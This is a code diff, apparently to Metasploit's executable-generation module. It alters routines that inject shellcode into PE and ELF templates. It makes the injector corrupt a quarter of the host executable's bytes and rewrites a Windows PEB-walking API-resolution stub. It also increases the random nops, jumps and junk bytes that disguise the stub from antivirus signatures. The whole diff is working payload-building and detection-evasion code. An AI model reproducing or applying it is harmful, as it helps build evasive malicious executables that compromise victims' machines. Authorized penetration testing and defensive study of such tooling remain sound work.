@@ -61,7 +61,7 @@ require 'metasm'
 			if(plat.index(Msf::Module::Platform::Linux))
 				return to_linux_armle_elf(framework, code)
 			end
-			
+
 			# XXX: Add remaining ARMLE systems here
 		end
 
@@ -244,9 +244,9 @@ require 'metasm'
 		# Relative jump from the end of the nops to the payload
 		entry += "\xe9" + [poff - (eidx + entry.length + 5)].pack('V')
 
-		# Mangle random bits of the original executable
-		1.upto(rand(block[1] / 512)) do
-			data[ block[0] + rand(block[1]), 1] = [rand(0x100)].pack("C")
+		# Mangle 25% of the original executable
+		1.upto(block[1] / 4) do
+		 	data[ block[0] + rand(block[1]), 1] = [rand(0x100)].pack("C")
 		end
 
 		# Patch the payload and the new entry point into the .text
@@ -464,12 +464,12 @@ require 'metasm'
 
 	def self.to_linux_armle_elf(framework, code)
 		mo = ''
-		
+
 		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_armle_linux.bin"), "rb")
 		mo = fd.read(fd.stat.size)
 		fd.close
-		
-		# The template is just an ELF header with its entrypoint set to the 
+
+		# The template is just an ELF header with its entrypoint set to the
 		# end of the file, so just append shellcode to it and fixup p_filesz
 		# and p_memsz in the header for a working ELF executable.
 		mo << code
@@ -937,10 +937,11 @@ require 'metasm'
 		api_call:
 		  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
 		  mov ebp, esp           ; Create a new stack frame
-		  xor edx, edx           ; Zero EDX
-		  mov edx, [fs:edx+48]   ; Get a pointer to the PEB
-		  mov edx, [edx+12]      ; Get PEB->Ldr
-		  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
+		  xor eax, eax           ; Zero EDX
+		  mov eax, [fs:eax+48]   ; Get a pointer to the PEB
+		  mov eax, [eax+12]      ; Get PEB->Ldr
+		  mov eax, [eax+20]      ; Get the first module from the InMemoryOrder module list
+		  mov edx, eax
 		next_mod:                ;
 		  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
 		  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
@@ -958,7 +959,7 @@ require 'metasm'
 		  ; We now have the module hash computed
 		  push edx               ; Save the current position in the module list for later
 		  push edi               ; Save the current module hash for later
-		  ; Proceed to itterate the export address table,
+		  ; Proceed to iterate the export address table,
 		  mov edx, [edx+16]      ; Get this modules base address
 		  mov eax, [edx+60]      ; Get PE header
 		  add eax, edx           ; Add the modules base address
@@ -972,7 +973,8 @@ require 'metasm'
 		  add ebx, edx           ; Add the modules base address
 		  ; Computing the module hash + function hash
 		get_next_func:           ;
-		  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
+		  test ecx, ecx          ; (Changed from JECXZ to work around METASM)
+		  jz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
 		  dec ecx                ; Decrement the function name counter
 		  mov esi, [ebx+ecx*4]   ; Get rva of next module name
 		  add esi, edx           ; Add the modules base address
@@ -1014,7 +1016,7 @@ require 'metasm'
 		  pop edi                ; Pop off the current (now the previous) modules hash
 		  pop edx                ; Restore our position in the module list
 		  mov edx, [edx]         ; Get the next module
-		  jmp short next_mod     ; Process this module
+		  jmp next_mod     ; Process this module
 		^
 
 		stub_exit = %Q^
@@ -1028,9 +1030,9 @@ require 'metasm'
 		  push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
 		  call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
 		  cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
-		  jl short goodbye       ; Then just call the exit function...
+		  jl goodbye             ; Then just call the exit function...
 		  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
-		  jne short goodbye      ;
+		  jne goodbye      ;
 		  mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
 		goodbye:                 ; We now perform the actual call to the exit function
 		  push byte 0            ; push the exit function parameter
@@ -1073,7 +1075,7 @@ require 'metasm'
 		  push dword [fs:eax]
 		  mov dword [fs:eax], esp
 		  call ebx
-		  jmp short exitblock
+		  jmp exitblock
 		^
 
 		stub_final = %Q^
@@ -1091,28 +1093,22 @@ require 'metasm'
 		# regs    = %W{eax ebx ecx edx esi edi ebp}
 
 		cnt_jmp = 0
-		cnt_nop = 64
-
 		stub_alloc.each_line do |line|
 			line.gsub!(/;.*/, '')
 			line.strip!
 			next if line.empty?
 
-			if (cnt_nop > 0 and rand(4) == 0)
+			if (rand(2) == 0)
 				wrapper << "nop\n"
-				cnt_nop -= 1
 			end
 
-			if(cnt_nop > 0 and rand(16) == 0)
-				cnt_nop -= 2
-				cnt_jmp += 1
-
+			if(rand(2) == 0)
 				wrapper << "jmp autojump#{cnt_jmp}\n"
-				1.upto(rand(8)+1) do
+				1.upto(rand(8)+8) do
 					wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
-					cnt_nop -= 1
 				end
 				wrapper << "autojump#{cnt_jmp}:\n"
+				cnt_jmp += 1
 			end
 			wrapper << line + "\n"
 		end
